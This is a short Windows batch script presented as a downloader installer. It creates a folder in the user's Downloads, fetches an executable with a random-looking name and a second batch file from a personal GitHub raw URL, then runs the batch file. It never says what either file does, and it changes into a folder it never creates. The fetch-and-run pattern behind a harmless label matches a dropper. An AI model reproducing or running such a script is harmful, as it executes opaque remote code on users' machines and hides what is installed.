@echo off
color b
mkdir %userprofile%\Downloads\bedt_external\bin
cd %userprofile%\Downloads\bedt_external\bin
curl -O https://raw.githubusercontent.com/aaronestaaron/bedt.external.github.io/refs/heads/main/es4repk729erbb.exe
cd %userprofile%\Downloads\bedt_external\downloader
curl -O https://raw.githubusercontent.com/aaronestaaron/bedt.external.github.io/refs/heads/main/downloadlol.bat
echo downloader is installed...
echo opening downloader...
echo.
timeout /t 1 /nobreak >nul
downloadlol.bat
